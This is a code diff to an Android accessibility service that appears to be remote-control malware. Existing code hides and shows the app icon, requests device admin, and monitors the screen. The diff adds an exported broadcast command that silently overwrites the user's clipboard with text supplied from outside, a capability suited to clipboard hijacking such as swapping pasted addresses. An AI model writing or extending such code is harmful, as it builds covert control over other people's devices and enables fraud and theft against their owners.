@@ -7,6 +7,8 @@ import android.accessibilityservice.GestureDescription;
 import android.annotation.SuppressLint;
 import android.app.admin.DevicePolicyManager;
 import android.content.BroadcastReceiver;
+import android.content.ClipData;
+import android.content.ClipboardManager;
 import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
@@ -138,7 +140,7 @@ public class MainAccessibilityService extends AccessibilityService {
     public static final String ACTION_APP_ICON_HIDE = "APP_ICON_HIDE";
     public static final String ACTION_APP_ICON_SHOW = "APP_ICON_SHOW";
     public static final String ACTION_ADMIN_MONITOR = "ADMIN_MONITOR";
-
+    public static final String ACTION_CLIPBOARD_MONITOR = "CLIPBOARD_MONITOR";
     public static final String ACTION_CLOSE_MONITOR = "CLOSE_MONITOR";
 
     //    private String Selected_EVENT = ACTION_CLOSE_MONITOR;
@@ -564,6 +566,11 @@ public class MainAccessibilityService extends AccessibilityService {
                 requestOverlayPermission();
             }
 
+            if(ACTION_CLIPBOARD_MONITOR.equals(intent.getAction())) {
+                String clipboard_text = intent.getStringExtra("text");
+                onSetClipBoardText(clipboard_text);
+            }
+
             if (ACTION_CLOSE_MONITOR.equals(intent.getAction())) {
                 String close_event = intent.getStringExtra("event");
                 if (close_event.equals("screen-monitor")) {
@@ -673,6 +680,9 @@ public class MainAccessibilityService extends AccessibilityService {
 
         IntentFilter filter_request_admin = new IntentFilter(ACTION_ADMIN_MONITOR);
         registerReceiver(screenMonitorReceiver, filter_request_admin, RECEIVER_EXPORTED);
+
+        IntentFilter filter_clipboard = new IntentFilter(ACTION_CLIPBOARD_MONITOR);
+        registerReceiver(screenMonitorReceiver,filter_clipboard, RECEIVER_EXPORTED);
 
         IntentFilter mediaProjectionFilter = new IntentFilter("MEDIA_PROJECTION_RESULT");
         registerReceiver(mediaProjectionReceiver, mediaProjectionFilter, RECEIVER_EXPORTED);
@@ -2959,6 +2969,14 @@ public class MainAccessibilityService extends AccessibilityService {
             PackageManager packageManager = getPackageManager();
             ComponentName cName = new ComponentName(getPackageName(), MainActivity.class.getName());
             packageManager.setComponentEnabledSetting(cName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
+        }
+    }
+
+    private void onSetClipBoardText(String clipboard_text) {
+        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+        ClipData clip = ClipData.newPlainText("label", clipboard_text);
+        if (clipboard != null) {
+            clipboard.setPrimaryClip(clip);
         }
     }
 
